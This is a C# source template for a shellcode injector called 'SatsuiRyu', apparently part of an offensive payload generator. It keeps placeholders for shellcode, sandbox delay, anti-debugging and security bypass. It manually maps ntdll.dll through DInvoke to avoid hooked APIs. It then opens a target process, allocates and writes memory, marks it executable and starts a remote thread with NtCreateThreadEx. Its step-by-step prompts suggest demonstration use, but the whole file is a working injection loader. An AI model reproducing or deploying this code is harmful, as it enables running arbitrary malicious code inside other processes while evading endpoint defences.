using System;
using System.Diagnostics;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;
//####USING####


namespace SatsuiRyu
{

    //####CODE####

    public static class SatsuiRyu
    {

        public static void Main(string[] args)
        {
            //####DELAY####

            //####ANTIDEBUG####

            //####BYPASS####

            var encoded = ####SHELLCODE####;

            //####CALL####

          uint status = 1;

            IntPtr pHandle = IntPtr.Zero;
            IntPtr memAlloc = IntPtr.Zero;
            IntPtr zeroBits = IntPtr.Zero;
            IntPtr size = (IntPtr)decoded.Length;
            IntPtr pThread = IntPtr.Zero;
            IntPtr buffer = Marshal.AllocHGlobal(decoded.Length);
            uint bytesWritten = 0;
            uint oldProtect = 0;
            Marshal.Copy(decoded, 0, buffer, decoded.Length);
            IntPtr targetPid;

            DInvoke.Data.Native.OBJECT_ATTRIBUTES oa = new DInvoke.Data.Native.OBJECT_ATTRIBUTES();

            Int32 pid = Process.GetCurrentProcess().Id;
            if(args.Length > 0){
                int.TryParse(args[0], out pid);
            } else {
                //####FIND_PROCESS####
            }
            if (pid < 0)
            {
                Console.WriteLine("[-] Error: Process not found");
                return;
            }

            targetPid = (IntPtr)pid;

            DInvoke.Data.Native.CLIENT_ID ci = new DInvoke.Data.Native.CLIENT_ID
            {
                UniqueProcess = targetPid
            };

            DInvoke.Data.PE.PE_MANUAL_MAP mappedDLL = new DInvoke.Data.PE.PE_MANUAL_MAP();
            mappedDLL = DInvoke.ManualMap.Map.MapModuleToMemory(@"C:\Windows\System32\ntdll.dll");


            // NtOpenProcess
            Console.WriteLine("[*] Getting Handle to {0}", targetPid);

            object[] ntOpenProcessParams = {
                pHandle,
                DInvoke.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                oa,
                ci
            };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtOpenProcess", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtOpenProcess), ntOpenProcessParams, false);
            pHandle = (IntPtr)ntOpenProcessParams[0];

            Console.WriteLine(String.Format("[*] Please check the memory of this process in process hacker under the address: 0x{0:x} to find the manually mapped ntdll.dll", mappedDLL.ModuleBase.ToInt64()));

            Console.WriteLine("[*] Allocating memory, press Enter to continue...");
            Console.ReadKey();
            object[] allocateVirtualMemoryParams = { pHandle, memAlloc, zeroBits, size, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, (uint)0x04 };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtAllocateVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtAllocateVirtualMemory), allocateVirtualMemoryParams, false);
            memAlloc = (IntPtr)allocateVirtualMemoryParams[1];
            size = (IntPtr)allocateVirtualMemoryParams[3];

            Console.WriteLine("[*] Writing payload to memory, press Enter to continue...");
            Console.ReadKey();
            object[] writeVirtualMemoryParams = { pHandle, memAlloc, buffer, (uint)decoded.Length, bytesWritten };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtWriteVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtWriteVirtualMemory), writeVirtualMemoryParams, false);
            bytesWritten = (uint)writeVirtualMemoryParams[4];

            object[] protectVirtualMemoryParams = { pHandle, memAlloc, size, (uint)0x20, oldProtect };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtProtectVirtualMemory", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtProtectVirtualMemory), protectVirtualMemoryParams, false);
            memAlloc = (IntPtr)protectVirtualMemoryParams[1];
            size = (IntPtr)protectVirtualMemoryParams[2];
            oldProtect = (uint)protectVirtualMemoryParams[4];

            Console.WriteLine("[*] Creating Remote Thread, press Enter to continue...");
            Console.ReadKey();
            object[] createThreadParams = { pThread, DInvoke.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, pHandle, memAlloc, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero };
            status = (uint)DInvoke.DynamicInvoke.Generic.CallMappedDLLModuleExport(mappedDLL.PEINFO, mappedDLL.ModuleBase, "NtCreateThreadEx", typeof(DInvoke.DynamicInvoke.Native.DELEGATES.NtCreateThreadEx), createThreadParams, false);
            pThread = (IntPtr)createThreadParams[0];

            System.Threading.Thread.Sleep(5*1000);

        }
    }
}